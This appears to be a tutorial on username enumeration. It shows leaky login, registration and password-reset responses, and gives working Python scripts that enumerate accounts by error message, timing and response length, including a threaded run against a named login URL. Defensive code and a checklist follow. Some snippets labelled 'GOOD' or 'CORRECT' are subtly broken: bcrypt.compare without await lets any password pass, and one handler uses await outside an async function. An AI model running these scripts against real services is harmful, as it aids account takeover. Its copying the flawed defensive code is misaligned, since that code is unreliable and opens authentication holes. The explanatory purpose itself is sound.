# 👤 **Username Enumeration - The Complete Guide**

## 🎯 **What is Username Enumeration?**

Think of it like trying to find valid email addresses before sending phishing emails:

```
┌─────────────────────────────────────────┐
│  ATTACKER'S GOAL:                        │
│  Find valid usernames FIRST!             │
│                                          │
│  Instead of guessing both:               │
│  username???:password???                 │
│                                          │
│  They find valid usernames:              │
│  ✓ john.doe@company.com                  │
│  ✓ admin@company.com                      │
│  ✗ fakeuser@company.com                   │
│                                          │
│  THEN focus on passwords!                 │
└─────────────────────────────────────────┘
```

## 🔍 **Where Username Enumeration Happens**

### **1. Login Page Enumeration**
```http
# Different error messages = enumeration vulnerability!

Request 1 (Existing User):
POST /login HTTP/1.1
Host: vulnerable-site.com

username=john.doe@company.com&password=wrong123

Response:
HTTP/1.1 200 OK
"Invalid password"  ← Tells attacker: "Username exists!"

Request 2 (Non-Existing User):
POST /login HTTP/1.1
Host: vulnerable-site.com

username=fakeuser@company.com&password=wrong123

Response:
HTTP/1.1 200 OK  
"Invalid username"  ← Tells attacker: "Username doesn't exist!"
```

### **2. Registration Form Enumeration**
```http
# "Username already taken" messages leak info!

Request 1 (Existing User):
POST /register HTTP/1.1
Host: vulnerable-site.com

username=admin&email=admin@company.com

Response:
HTTP/1.1 200 OK
"Username already taken"  ← Aha! admin exists!

Request 2 (New User):
POST /register HTTP/1.1
Host: vulnerable-site.com

username=newuser123&email=new@company.com

Response:
HTTP/1.1 200 OK
"Account created!"  ← Different message!
```

### **3. Password Reset Enumeration**
```http
# Password reset features are gold mines!

Request 1 (Existing User):
POST /forgot-password HTTP/1.1
Host: vulnerable-site.com

email=admin@company.com

Response:
"Password reset email sent to admin@company.com"

Request 2 (Non-Existing User):
POST /forgot-password HTTP/1.1
Host: vulnerable-site.com  

email=fake@company.com

Response:
"Email address not found"
```

## 🎪 **Real-World Examples**

### **Example 1: The Bank Login Page**
```python
import requests

def enumerate_usernames(base_url, username_list):
    """
    Test each username to see which exist
    """
    found_users = []
    
    for username in username_list:
        # Try login with wrong password
        data = {
            'username': username,
            'password': 'WrongPassword123!'
        }
        
        response = requests.post(f"{base_url}/login", data=data)
        
        # Check response for clues
        if "Invalid password" in response.text:
            print(f"✅ VALID: {username}")
            found_users.append(username)
        elif "Invalid username" in response.text:
            print(f"❌ Invalid: {username}")
        else:
            print(f"⚠️  Unknown: {username}")
    
    return found_users

# Test list
test_usernames = [
    'admin',
    'administrator',
    'john.doe',
    'jane.smith',
    'support',
    'info',
    'webmaster',
    'fakeuser123'
]

valid_users = enumerate_usernames('https://bank.com', test_usernames)
print(f"\nFound {len(valid_users)} valid usernames: {valid_users}")
```

### **Example 2: The Corporate Portal**
```http
# Different response codes leak info!

Request:
POST /portal/login HTTP/1.1
Host: company.com

username=admin&password=test

Response:
HTTP/1.1 302 Found  (Redirect to dashboard if successful)
HTTP/1.1 401 Unauthorized  (Wrong password for valid user)
HTTP/1.1 404 Not Found  (Username doesn't exist)

# Different status codes = enumeration!
```

### **Example 3: The API Endpoint**
```javascript
// Mobile app API - even more leaks!

// Check if username exists before registration
GET /api/check-username?username=admin

Response:
{
  "available": false,
  "message": "Username already taken"
}

GET /api/check-username?username=newuser123

Response:  
{
  "available": true,
  "message": "Username available"
}

// Attackers can automate this!
for(let i=0; i<1000; i++) {
  fetch(`/api/check-username?username=user${i}`)
    .then(r => r.json())
    .then(data => {
      if(!data.available) {
        console.log(`Found user: user${i}`);
      }
    });
}
```

## 🛠️ **Enumeration Techniques**

### **1. Timing Attacks**
```python
import time

def timing_enumeration(url, usernames):
    """
    Measure response time differences
    Valid users might take longer (password hash verification)
    """
    results = {}
    
    for username in usernames:
        start = time.time()
        
        response = requests.post(
            f"{url}/login",
            data={'username': username, 'password': 'wrong'}
        )
        
        elapsed = time.time() - start
        results[username] = elapsed
        
        print(f"{username}: {elapsed:.3f}s")
    
    # Valid users often have slightly longer response times
    avg_time = sum(results.values()) / len(results)
    print(f"\nAverage time: {avg_time:.3f}s")
    
    for username, elapsed in results.items():
        if elapsed > avg_time * 1.2:  # 20% slower
            print(f"⚠️  Possible valid user: {username} ({elapsed:.3f}s)")

# Example
usernames = ['admin', 'fake1', 'fake2', 'support', 'fake3']
timing_enumeration('https://target.com', usernames)
```

### **2. Content-Length Analysis**
```python
def analyze_response_lengths(url, usernames):
    """
    Compare response content lengths
    Different lengths often indicate valid usernames
    """
    responses = {}
    
    for username in usernames:
        response = requests.post(
            f"{url}/login",
            data={'username': username, 'password': 'wrong'}
        )
        
        responses[username] = len(response.text)
        print(f"{username}: {len(response.text)} bytes")
    
    # Find outliers
    from collections import Counter
    length_counts = Counter(responses.values())
    most_common_length = length_counts.most_common(1)[0][0]
    
    print(f"\nMost common length: {most_common_length}")
    print("Potential valid users:")
    
    for username, length in responses.items():
        if length != most_common_length:
            print(f"  {username} - {length} bytes")
```

### **3. Account Recovery Enumeration**
```python
def enumerate_via_password_reset(url, emails):
    """
    Use password reset feature to find valid emails
    """
    found = []
    
    for email in emails:
        response = requests.post(
            f"{url}/forgot-password",
            data={'email': email}
        )
        
        # Check different indicators
        if response.status_code == 200:
            if "Email sent" in response.text:
                print(f"✅ Valid: {email}")
                found.append(email)
            elif "not found" not in response.text.lower():
                print(f"⚠️  Check: {email}")
        
        # Check for redirects
        if len(response.history) > 0:
            print(f"🔄 Redirect for: {email}")
    
    return found
```

## 🎮 **Complete Attack Scenario**

### **Target: Social Media Platform**

**Phase 1: Gather Potential Usernames**
```python
# Common username patterns
patterns = [
    "admin",
    "support",
    "help",
    "info",
    "contact",
    "webmaster",
    "postmaster",
    "noreply",
    "no-reply",
    "accounts",
    "billing",
    "security"
]

# Generate variations
usernames = []
for pattern in patterns:
    usernames.extend([
        pattern,
        f"{pattern}@company.com",
        f"{pattern}.company",
        f"the{pattern}",
        f"{pattern}123"
    ])
```

**Phase 2: Test Login Endpoint**
```python
import requests
from concurrent.futures import ThreadPoolExecutor

def test_login(username):
    """Test single username"""
    data = {
        'username': username,
        'password': 'WrongPass123!'
    }
    
    try:
        r = requests.post(
            'https://social.com/login',
            data=data,
            allow_redirects=False
        )
        
        # Different responses indicate valid users
        if r.status_code == 302:  # Redirect = correct password
            return username, "VALID + PASSWORD FOUND!"
        elif 'Invalid password' in r.text:
            return username, "VALID USER"
        elif 'Invalid username' in r.text:
            return username, "INVALID"
        else:
            return username, f"UNKNOWN ({r.status_code})"
    except:
        return username, "ERROR"

# Test multiple usernames
with ThreadPoolExecutor(max_workers=5) as executor:
    results = executor.map(test_login, usernames)
    
    valid_users = []
    for username, status in results:
        print(f"{username}: {status}")
        if "VALID" in status:
            valid_users.append(username)

print(f"\nFound {len(valid_users)} valid users: {valid_users}")
```

**Phase 3: Analyze Patterns**
```python
def analyze_valid_users(valid_users):
    """
    Look for patterns in valid usernames
    """
    patterns = {
        'admin_accounts': [],
        'service_accounts': [],
        'personal_accounts': []
    }
    
    for user in valid_users:
        user_lower = user.lower()
        
        if any(term in user_lower for term in ['admin', 'root', 'sys']):
            patterns['admin_accounts'].append(user)
        elif any(term in user_lower for term in ['support', 'help', 'info']):
            patterns['service_accounts'].append(user)
        else:
            patterns['personal_accounts'].append(user)
    
    # Identify naming convention
    if valid_users:
        first_user = valid_users[0]
        if '.' in first_user:
            print("Pattern detected: first.last naming convention")
        elif '@' in first_user:
            print("Pattern detected: email addresses")
    
    return patterns
```

## 🛡️ **Defense Mechanisms**

### **1. Generic Error Messages**
```javascript
// BAD - Different messages
app.post('/login', (req, res) => {
    const user = db.findUser(req.body.username);
    
    if (!user) {
        return res.status(401).json({
            error: 'Invalid username'  // Too specific!
        });
    }
    
    if (!bcrypt.compare(req.body.password, user.password)) {
        return res.status(401).json({
            error: 'Invalid password'  // Different message!
        });
    }
});

// GOOD - Same message for all failures
app.post('/login', (req, res) => {
    const user = db.findUser(req.body.username);
    
    // Always same message
    const errorMessage = 'Invalid username or password';
    
    if (!user) {
        return res.status(401).json({ error: errorMessage });
    }
    
    if (!bcrypt.compare(req.body.password, user.password)) {
        // Artificial delay to prevent timing attacks
        setTimeout(() => {
            return res.status(401).json({ error: errorMessage });
        }, Math.random() * 100);
        return;
    }
    
    // Successful login
    req.session.user = user;
    res.json({ success: true });
});
```

### **2. Consistent Responses**
```javascript
// Ensure ALL responses are identical in structure
app.post('/forgot-password', async (req, res) => {
    const { email } = req.body;
    
    // Always same response message
    const response = {
        message: 'If the email exists, a reset link has been sent'
    };
    
    // Find user (but don't leak if found)
    const user = await db.findUserByEmail(email);
    
    if (user) {
        // Actually send email
        await sendResetEmail(user);
    } else {
        // Artificial delay to prevent timing attacks
        await new Promise(resolve => 
            setTimeout(resolve, Math.random() * 500)
        );
    }
    
    // Same response regardless
    res.json(response);
});
```

### **3. Rate Limiting on All Auth Endpoints**
```javascript
const rateLimit = require('express-rate-limit');

// Apply to ALL authentication endpoints
const authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 10, // 10 attempts
    message: 'Too many attempts, please try again later',
    skipSuccessfulRequests: true // Don't count successful logins
});

app.use('/login', authLimiter);
app.use('/register', authLimiter);
app.use('/forgot-password', authLimiter);
app.use('/api/check-username', authLimiter);
```

### **4. CAPTCHA for Multiple Attempts**
```javascript
let attemptCount = {};

app.post('/login', (req, res) => {
    const ip = req.ip;
    
    // Track attempts per IP
    attemptCount[ip] = (attemptCount[ip] || 0) + 1;
    
    // Require CAPTCHA after 3 attempts
    if (attemptCount[ip] > 3) {
        if (!req.body.captcha || !verifyCaptcha(req.body.captcha)) {
            return res.render('login', {
                error: 'Please complete CAPTCHA',
                showCaptcha: true
            });
        }
    }
    
    // Reset on successful login
    if (loginSuccess) {
        delete attemptCount[ip];
    }
});
```

### **5. Account Lockout**
```python
from datetime import datetime, timedelta
import redis

class AccountLockout:
    def __init__(self):
        self.redis = redis.Redis()
        self.max_attempts = 5
        self.lockout_time = 30  # minutes
    
    def check_login_allowed(self, username, ip):
        # Check username-based lockout
        user_key = f"lockout:user:{username}"
        user_locked = self.redis.get(user_key)
        
        if user_locked:
            remaining = self.redis.ttl(user_key) // 60
            return False, f"Account locked. Try again in {remaining} minutes"
        
        # Check IP-based lockout
        ip_key = f"lockout:ip:{ip}"
        ip_locked = self.redis.get(ip_key)
        
        if ip_locked:
            return False, "Too many attempts. Try again later"
        
        return True, "Allowed"
    
    def record_failed_attempt(self, username, ip):
        # Track failed attempts
        user_attempts = self.redis.incr(f"attempts:user:{username}")
        self.redis.expire(f"attempts:user:{username}", 900)  # 15 minutes
        
        ip_attempts = self.redis.incr(f"attempts:ip:{ip}")
        self.redis.expire(f"attempts:ip:{ip}", 900)
        
        # Lock if too many attempts
        if user_attempts >= self.max_attempts:
            self.redis.setex(
                f"lockout:user:{username}",
                self.lockout_time * 60,
                "locked"
            )
        
        if ip_attempts >= self.max_attempts * 3:
            self.redis.setex(
                f"lockout:ip:{ip}",
                self.lockout_time * 60,
                "locked"
            )
```

## 🔍 **Testing for Username Enumeration**

### **Enumeration Test Script**
```python
import requests
import time

def test_username_enumeration(base_url):
    """
    Comprehensive test for username enumeration
    """
    print("Testing for username enumeration...")
    
    endpoints = [
        '/login',
        '/register',
        '/forgot-password',
        '/api/check-username'
    ]
    
    test_users = [
        'admin',  # Likely exists
        'fakeuser123456',  # Likely doesn't exist
        'support',  # Likely exists
        'nonexistent789xyz'  # Likely doesn't exist
    ]
    
    results = {}
    
    for endpoint in endpoints:
        print(f"\nTesting {endpoint}:")
        endpoint_results = {}
        
        for user in test_users:
            # POST request
            data = {'username': user, 'email': user}
            if 'login' in endpoint:
                data['password'] = 'wrongpassword'
            
            start = time.time()
            response = requests.post(
                f"{base_url}{endpoint}",
                data=data,
                allow_redirects=False
            )
            elapsed = time.time() - start
            
            endpoint_results[user] = {
                'status_code': response.status_code,
                'content_length': len(response.text),
                'response_time': elapsed,
                'response_text': response.text[:200]  # First 200 chars
            }
            
            print(f"  {user}: {response.status_code} - {len(response.text)} bytes - {elapsed:.3f}s")
        
        results[endpoint] = endpoint_results
    
    # Analyze for inconsistencies
    print("\n" + "="*50)
    print("ANALYSIS RESULTS:")
    
    for endpoint, endpoint_results in results.items():
        print(f"\n{endpoint}:")
        
        # Check for status code differences
        statuses = set(r['status_code'] for r in endpoint_results.values())
        if len(statuses) > 1:
            print(f"  ⚠️  Different status codes: {statuses}")
        
        # Check for content length differences
        lengths = set(r['content_length'] for r in endpoint_results.values())
        if len(lengths) > 1:
            print(f"  ⚠️  Different content lengths: {lengths}")
        
        # Check for timing differences
        times = [r['response_time'] for r in endpoint_results.values()]
        avg_time = sum(times) / len(times)
        for user, data in endpoint_results.items():
            if data['response_time'] > avg_time * 1.5:
                print(f"  ⚠️  Slow response for {user}: {data['response_time']:.3f}s")
        
        # Check for message differences
        messages = set()
        for data in endpoint_results.values():
            # Extract error message
            text = data['response_text'].lower()
            if 'invalid' in text:
                messages.add('invalid')
            if 'not found' in text:
                messages.add('not found')
            if 'taken' in text:
                messages.add('taken')
        
        if len(messages) > 1:
            print(f"  ⚠️  Different error messages: {messages}")

# Run the test
test_username_enumeration('https://target-website.com')
```

## 📊 **Enumeration Impact Statistics**

```
IMPACT OF USERNAME ENUMERATION:
────────────────────────────────────
Without enumeration:
- Need to guess: 10,000 usernames × 10,000 passwords
- Total attempts: 100,000,000
- Time at 1 attempt/sec: 3.17 years

With enumeration:
- Found: 100 valid usernames
- Need to guess: 100 usernames × 10,000 passwords  
- Total attempts: 1,000,000
- Time at 1 attempt/sec: 11.6 days

Efficiency improvement: 99% faster!
```

## 🎯 **Common Mistakes to Avoid**

### **For Developers:**
```javascript
// MISTAKE 1: Different error messages
if (!user) {
    return res.send('User not found');  // ❌
}
if (!validPass) {
    return res.send('Wrong password');  // ❌
}

// CORRECT:
if (!user || !validPass) {
    return res.send('Invalid credentials');  // ✅
}

// MISTAKE 2: Different response times
// (No artificial delay)

// CORRECT:
if (!user || !validPass) {
    await delay(Math.random() * 100);  // Random delay
    return res.send('Invalid credentials');
}

// MISTAKE 3: Leaking in registration
app.post('/register', (req, res) => {
    if (userExists(req.body.username)) {
        return res.send('Username taken');  // ❌
    }
});

// CORRECT:
app.post('/register', (req, res) => {
    if (userExists(req.body.username)) {
        // Process normally but don't create account
        // Return same message as success
        return res.send('Registration complete. Check email for verification.');
    }
    // Actually create account
});
```

## 🔐 **Best Practices Summary**

### **Prevention Checklist:**
```
□ Generic error messages everywhere
□ Same response codes for all failures
□ Consistent response times (add delays)
□ Rate limiting on ALL auth endpoints
□ CAPTCHA after multiple attempts
□ Account lockout mechanisms
□ No "check username" APIs
□ Log all attempts for monitoring
□ Same response content length
```

### **Implementation Priorities:**
```javascript
// 1. First line: Rate limiting
app.use('/auth', rateLimiter);

// 2. Second line: Generic messages
app.post('/login', (req, res) => {
    // Always same message
    const errorMsg = 'Invalid credentials';
    
    // 3. Third line: Consistent timing
    const start = Date.now();
    const user = findUser(req.body.username);
    const valid = user && checkPassword(user, req.body.password);
    
    // Artificial delay
    const elapsed = Date.now() - start;
    await delay(Math.max(0, 100 - elapsed));
    
    if (!valid) {
        return res.status(401).json({ message: errorMsg });
    }
    
    // 4. Fourth line: CAPTCHA for suspicious activity
    if (isSuspicious(req)) {
        return res.json({ requireCaptcha: true });
    }
});
```

## 🎓 **Key Takeaways**

1. **Username enumeration is the first step** - Attackers find valid usernames BEFORE attacking passwords
2. **Small leaks lead to big breaches** - A single different error message can expose all users
3. **Consistency is crucial** - Same response, same timing, same everything
4. **Multiple attack vectors** - Login, registration, password reset ALL need protection
5. **Automation is the enemy** - Rate limiting and CAPTCHA stop automated enumeration
6. **Defense in depth** - Multiple layers of protection work best

Remember: **In authentication, boring is secure. Same messages, same timing, same responses - be consistently boring!** 🔒